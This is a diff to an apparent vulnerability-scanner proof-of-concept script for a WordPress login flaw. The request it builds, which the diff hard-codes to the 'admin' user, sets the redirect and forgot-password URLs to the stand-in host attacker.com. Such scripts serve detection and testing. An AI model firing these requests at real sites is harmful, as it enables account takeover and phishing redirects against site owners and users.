@@ -1,4 +1,5 @@
 import requests
+import re
 
 
 # Vuln Base Info
@@ -32,6 +33,7 @@ def fingerprint(url):
 # Proof of Concept
 def poc(url):
     result = {}
+    username = "admin"
     try:
         url = format_url(url)
 
@@ -41,7 +43,7 @@ def poc(url):
         headers = {}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
-        path = """/wp-login.php?action=theplusrp&key=&redirecturl=http://attacker.com&forgoturl=http://attacker.com&login={{username}}"""
+        path = """/wp-login.php?action=theplusrp&key=&redirecturl=http://attacker.com&forgoturl=http://attacker.com&login={username}""".format(username=username)
         method = "GET"
         data = """"""
         headers = {}
